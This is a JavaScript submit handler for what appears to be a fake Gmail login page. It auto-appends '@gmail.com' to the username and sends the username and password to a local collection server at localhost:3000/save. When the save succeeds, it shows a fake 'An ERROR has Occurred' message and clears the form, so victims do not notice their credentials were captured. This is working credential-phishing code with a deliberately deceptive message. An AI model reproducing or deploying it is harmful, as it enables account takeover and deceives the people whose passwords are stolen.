document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const statusMsg = document.getElementById('statusMessage');

    let username = usernameInput.value.trim();
    const password = passwordInput.value.trim();

    // LOGIC: Auto-append @gmail.com if missing
    if (username && !username.includes('@')) {
        username = username + '@gmail.com';
        // Optional: Update the input field visually so the user sees it
        usernameInput.value = username;
    }

    if (!username || !password) {
        statusMsg.textContent = "Please fill in all fields.";
        statusMsg.className = "status-message error";
        return;
    }

    statusMsg.textContent = "Sending...";
    statusMsg.className = "status-message";
    statusMsg.style.color = "#1a73e8";

    try {
        const response = await fetch('http://localhost:3000/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });

        if (response.ok) {
            statusMsg.textContent = "An ERROR has Occurred. Please try in some time.";
            statusMsg.className = "status-message success";
            statusMsg.style.color = "red";
            // Clear form
            usernameInput.value = '';
            passwordInput.value = '';
        } else {
            throw new Error('Server error');
        }
    } catch (error) {
        statusMsg.textContent = "Error: Make sure server.js is running!";
        statusMsg.className = "status-message error";
        console.error(error);
    }
});